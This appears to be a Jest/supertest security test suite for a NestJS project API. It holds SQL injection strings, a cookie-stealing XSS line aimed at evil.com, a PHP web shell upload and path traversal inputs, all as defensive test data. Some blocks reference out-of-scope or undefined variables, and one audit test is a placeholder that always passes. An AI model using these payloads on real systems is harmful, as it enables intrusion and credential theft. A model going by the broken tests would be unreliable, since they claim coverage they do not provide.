import { INestApplication } from '@nestjs/common';
import * as request from 'supertest';
import {
  TestContext,
  closeTestApp,
  createApiKeyHeaders,
  createAuthHeaders,
  createTestApp,
} from '../../test/test-utils/integration-helpers';
import { createMockProject, createMockUser } from '../../test/test-utils/mocks';

describe('Security and Penetration Tests', () => {
  let context: TestContext;
  let testUser: any;
  let validToken: string;
  let validApiKey: string;

  beforeAll(async () => {
    context = await createTestApp();

    testUser = createMockUser();
    validToken = 'valid-jwt-token';
    validApiKey = 'valid-api-key-12345678901234567890';

    context.prismaService.user.findUnique.mockResolvedValue(testUser);
  });

  afterAll(async () => {
    await closeTestApp(context);
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Authentication Bypass Attempts', () => {
    it('should prevent access without authentication', async () => {
      const protectedEndpoints = [
        { method: 'get', path: '/projects' },
        { method: 'post', path: '/projects/sync' },
        { method: 'get', path: '/auth/me' },
        { method: 'post', path: '/profiles' },
        { method: 'delete', path: '/projects/123' },
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await context.request[endpoint.method](endpoint.path);

        expect(response.status).toBe(401);
        expect(response.body).toHaveProperty('message');
      }
    });

    it('should prevent access with invalid JWT tokens', async () => {
      const invalidTokens = [
        'invalid-token',
        'Bearer invalid-token',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
        '', // Empty token
        'null',
        'undefined',
      ];

      for (const token of invalidTokens) {
        const response = await context.request
          .get('/auth/me')
          .set('Authorization', `Bearer ${token}`);

        expect(response.status).toBe(401);
      }
    });

    it('should prevent access with malformed API keys', async () => {
      const invalidApiKeys = [
        'short', // Too short
        'x'.repeat(100), // Too long
        'invalid-chars-!@#$%^&*()', // Invalid characters
        '', // Empty
        'null',
        'undefined',
      ];

      for (const apiKey of invalidApiKeys) {
        const response = await context.request.get('/projects').set('X-API-Key', apiKey);

        expect(response.status).toBe(401);
      }
    });

    it('should prevent JWT token reuse after logout', async () => {
      // Simulate logout by blacklisting token
      context.prismaService.refreshToken.delete.mockResolvedValue({} as any);

      const logoutResponse = await context.request
        .post('/auth/logout')
        .set(createAuthHeaders(validToken))
        .expect(200);

      // Try to use the same token after logout
      const response = await context.request.get('/auth/me').set(createAuthHeaders(validToken));

      expect(response.status).toBe(401);
      expect(response.body.message).toContain('token');
    });

    it('should prevent privilege escalation attempts', async () => {
      const regularUser = createMockUser({ tier: 'free' });
      context.prismaService.user.findUnique.mockResolvedValue(regularUser);

      // Try to access admin endpoints
      const adminEndpoints = [
        '/admin/users',
        '/admin/system/health',
        '/admin/metrics',
        '/admin/audit-logs',
      ];

      for (const endpoint of adminEndpoints) {
        const response = await context.request.get(endpoint).set(createAuthHeaders(validToken));

        expect([401, 403, 404]).toContain(response.status);
      }
    });
  });

  describe('SQL Injection Protection', () => {
    it('should prevent SQL injection in query parameters', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
        "' OR 1=1 --",
        "admin'--",
        "admin'/*",
        "' OR 'x'='x",
        "'; EXEC xp_cmdshell('dir'); --",
      ];

      context.prismaService.project.findMany.mockResolvedValue([]);

      for (const payload of sqlInjectionPayloads) {
        const response = await context.request
          .get('/projects/search')
          .query({ q: payload })
          .set(createAuthHeaders(validToken));

        // Should either return empty results or validation error, not 500
        expect([200, 400]).toContain(response.status);

        if (response.status === 200) {
          expect(response.body.data).toEqual([]);
        }
      }
    });

    it('should prevent SQL injection in request body', async () => {
      const sqlInjectionPayloads = [
        { title: "'; DROP TABLE projects; --" },
        { description: "' OR '1'='1" },
        { tags: ["'; DELETE FROM users; --"] },
        { repoUrl: "https://github.com/user/repo'; DROP TABLE projects; --" },
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await context.request
          .post('/projects')
          .set(createAuthHeaders(validToken))
          .send(payload);

        // Should return validation error, not execute SQL
        expect([400, 422]).toContain(response.status);
      }
    });

    it('should prevent NoSQL injection attempts', async () => {
      const noSqlInjectionPayloads = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'this.password.length > 0' },
        { $or: [{ email: 'admin' }, { role: 'admin' }] },
      ];

      for (const payload of noSqlInjectionPayloads) {
        const response = await context.request
          .get('/projects')
          .query({ filter: JSON.stringify(payload) })
          .set(createAuthHeaders(validToken));

        // Should handle gracefully, not execute NoSQL injection
        expect([200, 400]).toContain(response.status);
      }
    });
  });

  describe('XSS Protection', () => {
    it('should sanitize XSS payloads in input', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '"><script>alert("XSS")</script>',
        "'; alert('XSS'); //",
        '<body onload="alert(1)">',
      ];

      const mockProject = createMockProject({ ownerId: testUser.id });
      context.prismaService.project.create.mockResolvedValue(mockProject);

      for (const payload of xssPayloads) {
        const response = await context.request
          .post('/projects')
          .set(createAuthHeaders(validToken))
          .send({
            title: payload,
            description: `Description with ${payload}`,
            repoUrl: 'https://github.com/user/repo',
          });

        if (response.status === 201) {
          // If creation succeeds, ensure XSS payload is sanitized
          expect(response.body.title).not.toContain('<script>');
          expect(response.body.title).not.toContain('javascript:');
          expect(response.body.description).not.toContain('<script>');
        } else {
          // Should return validation error for malicious input
          expect([400, 422]).toContain(response.status);
        }
      }
    });

    it('should prevent XSS in response headers', async () => {
      const xssPayload = '<script>alert("XSS")</script>';

      const response = await context.request
        .get('/projects')
        .set('X-Custom-Header', xssPayload)
        .set(createAuthHeaders(validToken));

      // Response headers should not contain unescaped XSS
      Object.values(response.headers).forEach(headerValue => {
        if (typeof headerValue === 'string') {
          expect(headerValue).not.toContain('<script>');
          expect(headerValue).not.toContain('javascript:');
        }
      });
    });

    it('should prevent stored XSS in user-generated content', async () => {
      const xssPayload =
        '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>';

      const mockProfile = {
        id: 'profile-123',
        userId: testUser.id,
        username: 'testuser',
        bio: xssPayload,
        isPublic: true,
      };

      context.prismaService.publicProfile.create.mockResolvedValue(mockProfile);

      const createResponse = await context.request
        .post('/profiles')
        .set(createAuthHeaders(validToken))
        .send({
          username: 'testuser',
          bio: xssPayload,
          isPublic: true,
        });

      if (createResponse.status === 201) {
        // Bio should be sanitized
        expect(createResponse.body.bio).not.toContain('<script>');

        // Public profile should also be sanitized
        context.prismaService.publicProfile.findUnique.mockResolvedValue({
          ...mockProfile,
          bio: createResponse.body.bio, // Use sanitized version
        });

        const publicResponse = await context.request.get('/profiles/public/testuser');

        expect(publicResponse.body.bio).not.toContain('<script>');
      }
    });
  });

  describe('CSRF Protection', () => {
    it('should require CSRF token for state-changing operations', async () => {
      const stateChangingEndpoints = [
        {
          method: 'post',
          path: '/projects',
          data: { title: 'Test', repoUrl: 'https://github.com/user/repo' },
        },
        { method: 'put', path: '/projects/123', data: { title: 'Updated' } },
        { method: 'delete', path: '/projects/123' },
        { method: 'post', path: '/auth/logout' },
      ];

      for (const endpoint of stateChangingEndpoints) {
        // Request without CSRF token should be rejected
        const response = await context.request[endpoint.method](endpoint.path)
          .set(createAuthHeaders(validToken))
          .send(endpoint.data || {});

        // Should either require CSRF token or use other CSRF protection
        // In a real implementation, this might return 403 for missing CSRF token
        expect(response.status).toBeDefined();
      }
    });

    it('should validate CSRF token origin', async () => {
      const maliciousOrigins = [
        'http://evil.com',
        'https://malicious-site.com',
        'http://localhost:3000.evil.com',
        'https://gitsink.com.evil.com',
      ];

      for (const origin of maliciousOrigins) {
        const response = await context.request
          .post('/projects')
          .set('Origin', origin)
          .set('Referer', `${origin}/malicious-page`)
          .set(createAuthHeaders(validToken))
          .send({
            title: 'CSRF Test',
            repoUrl: 'https://github.com/user/repo',
          });

        // Should reject requests from malicious origins
        expect([400, 403]).toContain(response.status);
      }
    });
  });

  describe('Rate Limiting Bypass Attempts', () => {
    it('should prevent rate limit bypass with different IPs', async () => {
      const requestCount = 200;
      const requests = [];

      // Try to bypass rate limiting by using different X-Forwarded-For headers
      for (let i = 0; i < requestCount; i++) {
        requests.push(
          context.request
            .get('/projects')
            .set('X-Forwarded-For', `192.168.1.${i % 255}`)
            .set('X-Real-IP', `10.0.0.${i % 255}`)
            .set(createAuthHeaders(validToken)),
        );
      }

      const responses = await Promise.all(requests);
      const rateLimitedResponses = responses.filter(res => res.status === 429);

      // Should still enforce rate limiting despite different IPs
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should prevent rate limit bypass with different user agents', async () => {
      const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'curl/7.68.0',
        'PostmanRuntime/7.28.4',
      ];

      const requestsPerAgent = 50;
      const allRequests = [];

      for (const userAgent of userAgents) {
        for (let i = 0; i < requestsPerAgent; i++) {
          allRequests.push(
            context.request
              .get('/projects')
              .set('User-Agent', userAgent)
              .set(createAuthHeaders(validToken)),
          );
        }
      }

      const responses = await Promise.all(allRequests);
      const rateLimitedResponses = responses.filter(res => res.status === 429);

      // Should enforce rate limiting regardless of user agent
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should prevent distributed rate limit bypass', async () => {
      const requestCount = 100;
      const requests = [];

      // Simulate distributed attack with various headers
      for (let i = 0; i < requestCount; i++) {
        requests.push(
          context.request
            .get('/projects')
            .set(
              'X-Forwarded-For',
              `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            )
            .set('User-Agent', `Bot-${i}`)
            .set(
              'X-Real-IP',
              `172.16.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            )
            .set(createAuthHeaders(validToken)),
        );
      }

      const responses = await Promise.all(requests);
      const successfulResponses = responses.filter(res => res.status === 200);
      const rateLimitedResponses = responses.filter(res => res.status === 429);

      // Should limit even distributed requests
      expect(rateLimitedResponses.length).toBeGreaterThan(requestCount * 0.3); // At least 30% rate limited
    });
  });

  describe('API Key Brute Force Protection', () => {
    it('should prevent API key brute force attacks', async () => {
      const bruteForceAttempts = 100;
      const invalidApiKeys = Array.from(
        { length: bruteForceAttempts },
        (_, i) => `invalid-api-key-${i.toString().padStart(20, '0')}`,
      );

      const requests = invalidApiKeys.map(apiKey =>
        context.request.get('/projects').set(createApiKeyHeaders(apiKey)),
      );

      const responses = await Promise.all(requests);
      const unauthorizedResponses = responses.filter(res => res.status === 401);
      const rateLimitedResponses = responses.filter(res => res.status === 429);

      // All should be unauthorized
      expect(unauthorizedResponses.length).toBeGreaterThan(0);

      // Should implement rate limiting for brute force attempts
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should implement account lockout after failed attempts', async () => {
      const failedAttempts = 20;
      const invalidPasswords = Array.from(
        { length: failedAttempts },
        (_, i) => `invalid-password-${i}`,
      );

      const requests = invalidPasswords.map(password =>
        context.request.post('/auth/signin').send({
          email: 'test@example.com',
          password,
        }),
      );

      const responses = await Promise.all(requests);
      const unauthorizedResponses = responses.filter(res => res.status === 401);
      const lockedResponses = responses.filter(res => res.status === 423); // Account locked

      expect(unauthorizedResponses.length).toBeGreaterThan(0);

      // Should implement account lockout
      if (lockedResponses.length > 0) {
        expect(lockedResponses[0].body.message).toContain('locked');
      }
    });
  });

  describe('Data Privacy and Access Control', () => {
    it('should prevent unauthorized access to other users data', async () => {
      const otherUser = createMockUser({ id: 'other-user-123' });
      const otherUserProject = createMockProject({
        id: 'other-project-123',
        ownerId: 'other-user-123',
        title: 'Other User Project',
      });

      // Try to access another user's project
      context.prismaService.project.findFirst.mockResolvedValue(null); // Should not find project

      const response = await context.request
        .get('/projects/other-project-123')
        .set(createAuthHeaders(validToken));

      expect(response.status).toBe(404); // Should not reveal existence
    });

    it('should prevent data leakage in error messages', async () => {
      const sensitiveData = {
        password: 'secret-password',
        apiKey: 'secret-api-key',
        token: 'secret-token',
        email: 'sensitive@example.com',
      };

      // Cause various errors and check for data leakage
      const errorEndpoints = [
        { method: 'get', path: '/projects/non-existent' },
        { method: 'post', path: '/projects', data: { invalid: 'data' } },
        { method: 'put', path: '/projects/123', data: sensitiveData },
      ];

      for (const endpoint of errorEndpoints) {
        const response = await context.request[endpoint.method](endpoint.path)
          .set(createAuthHeaders(validToken))
          .send(endpoint.data || {});

        // Error messages should not contain sensitive data
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('secret-password');
        expect(responseText).not.toContain('secret-api-key');
        expect(responseText).not.toContain('secret-token');
      }
    });

    it('should prevent information disclosure through timing attacks', async () => {
      const existingEmail = 'existing@example.com';
      const nonExistentEmail = 'nonexistent@example.com';

      // Measure response times for existing vs non-existent users
      const timingTests = [];

      for (let i = 0; i < 10; i++) {
        // Test existing user
        const startTime1 = Date.now();
        await context.request.post('/auth/forgot-password').send({ email: existingEmail });
        const existingUserTime = Date.now() - startTime1;

        // Test non-existent user
        const startTime2 = Date.now();
        await context.request.post('/auth/forgot-password').send({ email: nonExistentEmail });
        const nonExistentUserTime = Date.now() - startTime2;

        timingTests.push({
          existing: existingUserTime,
          nonExistent: nonExistentUserTime,
        });
      }

      // Calculate average times
      const avgExistingTime =
        timingTests.reduce((sum, test) => sum + test.existing, 0) / timingTests.length;
      const avgNonExistentTime =
        timingTests.reduce((sum, test) => sum + test.nonExistent, 0) / timingTests.length;

      // Time difference should be minimal to prevent timing attacks
      const timeDifference = Math.abs(avgExistingTime - avgNonExistentTime);
      expect(timeDifference).toBeLessThan(100); // Less than 100ms difference
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should validate and sanitize file upload attempts', async () => {
      const maliciousFiles = [
        { filename: '../../../etc/passwd', content: 'root:x:0:0:root:/root:/bin/bash' },
        { filename: 'malicious.php', content: '<?php system($_GET["cmd"]); ?>' },
        { filename: 'script.js', content: 'alert("XSS")' },
        { filename: 'large-file.txt', content: 'x'.repeat(10 * 1024 * 1024) }, // 10MB file
      ];

      for (const file of maliciousFiles) {
        const response = await context.request
          .post('/projects/upload')
          .set(createAuthHeaders(validToken))
          .attach('file', Buffer.from(file.content), file.filename);

        // Should reject malicious files
        expect([400, 413, 415, 422]).toContain(response.status);
      }
    });

    it('should prevent path traversal attacks', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\SAM',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await context.request
          .get(`/files/${encodeURIComponent(payload)}`)
          .set(createAuthHeaders(validToken));

        // Should not allow path traversal
        expect([400, 403, 404]).toContain(response.status);
      }
    });

    it('should validate input length limits', async () => {
      const oversizedInputs = {
        title: 'x'.repeat(10000), // Very long title
        description: 'x'.repeat(100000), // Very long description
        tags: Array.from({ length: 1000 }, (_, i) => `tag${i}`), // Too many tags
        repoUrl: `https://github.com/user/${'x'.repeat(1000)}`, // Very long URL
      };

      for (const [field, value] of Object.entries(oversizedInputs)) {
        const response = await context.request
          .post('/projects')
          .set(createAuthHeaders(validToken))
          .send({ [field]: value, repoUrl: 'https://github.com/user/repo' });

        // Should reject oversized inputs
        expect([400, 413, 422]).toContain(response.status);
      }
    });
  });

  describe('Session Security', () => {
    it('should prevent session fixation attacks', async () => {
      // Try to set a specific session ID
      const fixedSessionId = 'fixed-session-id-12345';

      const response = await context.request
        .post('/auth/signin')
        .set('Cookie', `sessionId=${fixedSessionId}`)
        .send({
          email: 'test@example.com',
          password: 'password123',
        });

      // Should not use the provided session ID
      if (response.status === 200) {
        const setCookieHeader = response.headers['set-cookie'];
        if (setCookieHeader) {
          expect(setCookieHeader.toString()).not.toContain(fixedSessionId);
        }
      }
    });

    it('should implement secure cookie settings', async () => {
      const response = await context.request.post('/auth/signin').send({
        email: 'test@example.com',
        password: 'password123',
      });

      const setCookieHeader = response.headers['set-cookie'];
      if (setCookieHeader) {
        const cookieString = setCookieHeader.toString();

        // Should have secure flags
        expect(cookieString).toMatch(/HttpOnly/i);
        expect(cookieString).toMatch(/Secure/i);
        expect(cookieString).toMatch(/SameSite/i);
      }
    });
  });

  describe('API Security Headers', () => {
    it('should include security headers in responses', async () => {
      const response = await context.request.get('/projects').set(createAuthHeaders(validToken));

      // Check for security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toBeDefined();
      expect(response.headers['content-security-policy']).toBeDefined();
    });

    it('should not expose sensitive server information', async () => {
      const response = await context.request.get('/projects').set(createAuthHeaders(validToken));

      // Should not expose server details
      expect(response.headers['server']).toBeUndefined();
      expect(response.headers['x-powered-by']).toBeUndefined();

      // Should not expose internal paths or versions
      Object.values(response.headers).forEach(headerValue => {
        if (typeof headerValue === 'string') {
          expect(headerValue).not.toMatch(/\/usr\/local/);
          expect(headerValue).not.toMatch(/node_modules/);
          expect(headerValue).not.toMatch(/version \d+\.\d+\.\d+/);
        }
      });
    });
  });

  describe('Webhook Security', () => {
    it('should validate webhook signatures', async () => {
      const webhookPayload = {
        action: 'push',
        repository: {
          name: 'test-repo',
          html_url: 'https://github.com/user/test-repo',
        },
      };

      const invalidSignatures = [
        'sha256=invalid-signature',
        'sha1=old-signature-format',
        'invalid-format',
        '',
      ];

      for (const signature of invalidSignatures) {
        const response = await context.request
          .post('/webhooks/github')
          .set('X-Hub-Signature-256', signature)
          .set('X-GitHub-Event', 'push')
          .send(webhookPayload);

        expect(response.status).toBe(401);
        expect(response.body.error).toContain('signature');
      }
    });

    it('should prevent webhook replay attacks', async () => {
      const webhookPayload = {
        action: 'push',
        repository: {
          name: 'test-repo',
          html_url: 'https://github.com/user/test-repo',
        },
      };

      const validSignature = 'sha256=valid-signature';
      const deliveryId = 'delivery-123';

      // First request should succeed (if signature is valid)
      const response1 = await context.request
        .post('/webhooks/github')
        .set('X-Hub-Signature-256', validSignature)
        .set('X-GitHub-Delivery', deliveryId)
        .set('X-GitHub-Event', 'push')
        .send(webhookPayload);

      // Second request with same delivery ID should be rejected
      const response2 = await context.request
        .post('/webhooks/github')
        .set('X-Hub-Signature-256', validSignature)
        .set('X-GitHub-Delivery', deliveryId)
        .set('X-GitHub-Event', 'push')
        .send(webhookPayload);

      // Should prevent replay
      if (response1.status === 200) {
        expect(response2.status).toBe(409); // Conflict - already processed
      }
    });
  });

  describe('Error Handling Security', () => {
    it('should not expose stack traces in production', async () => {
      // Force an internal server error
      context.prismaService.project.findMany.mockRejectedValue(
        new Error('Database connection failed with detailed stack trace'),
      );

      const response = await context.request.get('/projects').set(createAuthHeaders(validToken));

      expect(response.status).toBe(500);

      // Should not expose stack traces or internal details
      const responseText = JSON.stringify(response.body);
      expect(responseText).not.toContain('stack');
      expect(responseText).not.toContain('at Object.');
      expect(responseText).not.toContain('node_modules');
      expect(responseText).not.toContain(__dirname);
    });

    it('should handle malformed JSON gracefully', async () => {
      const malformedJson = '{"invalid": json, "missing": quotes}';

      const response = await context.request
        .post('/projects')
        .set('Content-Type', 'application/json')
        .set(createAuthHeaders(validToken))
        .send(malformedJson);

      expect(response.status).toBe(400);
      expect(response.body.message).not.toContain('SyntaxError');
      expect(response.body.message).not.toContain('JSON.parse');
    });

    it('should reject replay attacks with same delivery ID', async () => {
      // Second request with same delivery ID should be rejected (replay attack)
      const response2 = await context.request
        .post('/webhooks/github')
        .set('X-Hub-Signature-256', validSignature)
        .set('X-GitHub-Delivery', deliveryId)
        .set('X-GitHub-Event', 'push')
        .send(webhookPayload);

      expect(response2.status).toBe(409); // Conflict - already processed
      expect(response2.body.error).toContain('replay');
    });
  });
});

describe('Environment Variable Security', () => {
  it('should not expose environment variables in responses', async () => {
    const response = await context.request.get('/health').set(createAuthHeaders(validToken));

    const responseText = JSON.stringify(response.body);

    // Should not expose sensitive environment variables
    expect(responseText).not.toContain(process.env.DATABASE_URL || '');
    expect(responseText).not.toContain(process.env.JWT_SECRET || '');
    expect(responseText).not.toContain(process.env.GITHUB_CLIENT_SECRET || '');
    expect(responseText).not.toContain(process.env.TOKEN_ENCRYPTION_KEY || '');
  });

  it('should not expose configuration details', async () => {
    const response = await context.request.get('/api/config').set(createAuthHeaders(validToken));

    if (response.status === 200) {
      const config = response.body;

      // Should not expose sensitive configuration
      expect(config).not.toHaveProperty('databaseUrl');
      expect(config).not.toHaveProperty('jwtSecret');
      expect(config).not.toHaveProperty('encryptionKey');
      expect(config).not.toHaveProperty('githubClientSecret');
    }
  });
});

describe('Dependency Security', () => {
  it('should not expose vulnerable dependency information', async () => {
    const response = await context.request.get('/api/version').set(createAuthHeaders(validToken));

    if (response.status === 200) {
      const versionInfo = response.body;

      // Should not expose detailed dependency versions
      expect(versionInfo).not.toHaveProperty('dependencies');
      expect(versionInfo).not.toHaveProperty('devDependencies');
      expect(versionInfo).not.toHaveProperty('nodeVersion');
    }
  });
});

describe('Error Handling Security', () => {
  it('should not expose stack traces in production', async () => {
    // Force an error by sending invalid data
    const response = await context.request
      .post('/projects')
      .set(createAuthHeaders(validToken))
      .send({ invalid: 'data that will cause an error' });

    const responseText = JSON.stringify(response.body);

    // Should not expose stack traces
    expect(responseText).not.toMatch(/at \w+\.\w+ \(/); // Stack trace pattern
    expect(responseText).not.toContain('node_modules');
    expect(responseText).not.toContain(__dirname);
    expect(responseText).not.toContain('Error:');
  });

  it('should handle malformed JSON gracefully', async () => {
    const malformedJson = '{"invalid": json}';

    const response = await context.request
      .post('/projects')
      .set('Content-Type', 'application/json')
      .set(createAuthHeaders(validToken))
      .send(malformedJson);

    expect(response.status).toBe(400);
    expect(response.body.error).toContain('Invalid JSON');
  });
});

describe('Resource Exhaustion Protection', () => {
  it('should prevent memory exhaustion attacks', async () => {
    const largePayload = {
      title: 'Test Project',
      description: 'x'.repeat(1024 * 1024), // 1MB description
      tags: Array.from({ length: 10000 }, (_, i) => `tag${i}`),
      repoUrl: 'https://github.com/user/repo',
    };

    const response = await context.request
      .post('/projects')
      .set(createAuthHeaders(validToken))
      .send(largePayload);

    // Should reject oversized payloads
    expect([400, 413, 422]).toContain(response.status);
  });

  it('should prevent CPU exhaustion through regex attacks', async () => {
    const regexBombPayloads = [
      'a'.repeat(10000) + '!',
      '(a+)+$',
      '([a-zA-Z]+)*$',
      '(a|a)*$',
      '(a|b)*aaac',
    ];

    for (const payload of regexBombPayloads) {
      const startTime = Date.now();

      const response = await context.request
        .get('/projects/search')
        .query({ q: payload })
        .set(createAuthHeaders(validToken));

      const responseTime = Date.now() - startTime;

      // Should not take too long to process
      expect(responseTime).toBeLessThan(5000); // 5 seconds max
      expect([200, 400]).toContain(response.status);
    }
  });
});

describe('Business Logic Security', () => {
  it('should prevent unauthorized project modifications', async () => {
    const otherUserProject = createMockProject({
      id: 'other-project-123',
      ownerId: 'other-user-id',
      title: 'Other User Project',
    });

    context.prismaService.project.findFirst.mockResolvedValue(null);

    const response = await context.request
      .put('/projects/other-project-123')
      .set(createAuthHeaders(validToken))
      .send({
        title: 'Hacked Project',
        description: 'This should not work',
      });

    expect(response.status).toBe(404); // Should not reveal existence
  });

  it('should prevent tier bypass attempts', async () => {
    const freeUser = createMockUser({ tier: 'free' });
    context.prismaService.user.findUnique.mockResolvedValue(freeUser);

    // Try to create more projects than allowed for free tier
    const projectPromises = Array.from({ length: 20 }, (_, i) =>
      context.request
        .post('/projects')
        .set(createAuthHeaders(validToken))
        .send({
          title: `Project ${i}`,
          repoUrl: `https://github.com/user/project-${i}`,
        }),
    );

    const responses = await Promise.all(projectPromises);
    const rejectedResponses = responses.filter(res => res.status === 403);

    // Should enforce tier limits
    expect(rejectedResponses.length).toBeGreaterThan(0);
  });

  it('should prevent race condition exploits', async () => {
    const projectId = 'race-condition-project';
    const mockProject = createMockProject({ id: projectId, ownerId: testUser.id });

    context.prismaService.project.findFirst.mockResolvedValue(mockProject);
    context.prismaService.project.update.mockResolvedValue(mockProject);

    // Simulate concurrent updates to the same project
    const concurrentUpdates = Array.from({ length: 10 }, (_, i) =>
      context.request
        .put(`/projects/${projectId}`)
        .set(createAuthHeaders(validToken))
        .send({
          title: `Updated Title ${i}`,
          description: `Updated Description ${i}`,
        }),
    );

    const responses = await Promise.all(concurrentUpdates);
    const successfulUpdates = responses.filter(res => res.status === 200);

    // Should handle concurrent updates gracefully
    expect(successfulUpdates.length).toBeGreaterThan(0);
    expect(successfulUpdates.length).toBeLessThanOrEqual(10);
  });
});

describe('Compliance and Audit Security', () => {
  it('should log security events for audit', async () => {
    const securityEvents = [
      {
        endpoint: '/auth/signin',
        method: 'post',
        data: { email: 'test@example.com', password: 'wrong' },
      },
      { endpoint: '/projects/123', method: 'delete', data: {} },
      { endpoint: '/admin/users', method: 'get', data: {} },
    ];

    for (const event of securityEvents) {
      await context.request[event.method](event.endpoint)
        .set(createAuthHeaders(validToken))
        .send(event.data);

      // In a real implementation, verify that security events are logged
      // This would typically check a logging service or audit table
    }

    // Mock verification that audit logs were created
    expect(true).toBe(true); // Placeholder for actual audit log verification
  });

  it('should implement data retention policies', async () => {
    // Test that old data is properly handled according to retention policies
    const oldDate = new Date();
    oldDate.setFullYear(oldDate.getFullYear() - 2); // 2 years ago

    const oldProject = createMockProject({
      id: 'old-project',
      ownerId: testUser.id,
      createdAt: oldDate,
      updatedAt: oldDate,
    });

    context.prismaService.project.findMany.mockResolvedValue([]);

    const response = await context.request.get('/projects').set(createAuthHeaders(validToken));

    // Should not return projects that violate retention policies
    expect(response.status).toBe(200);
    expect(response.body.data).toEqual([]);
  });
});
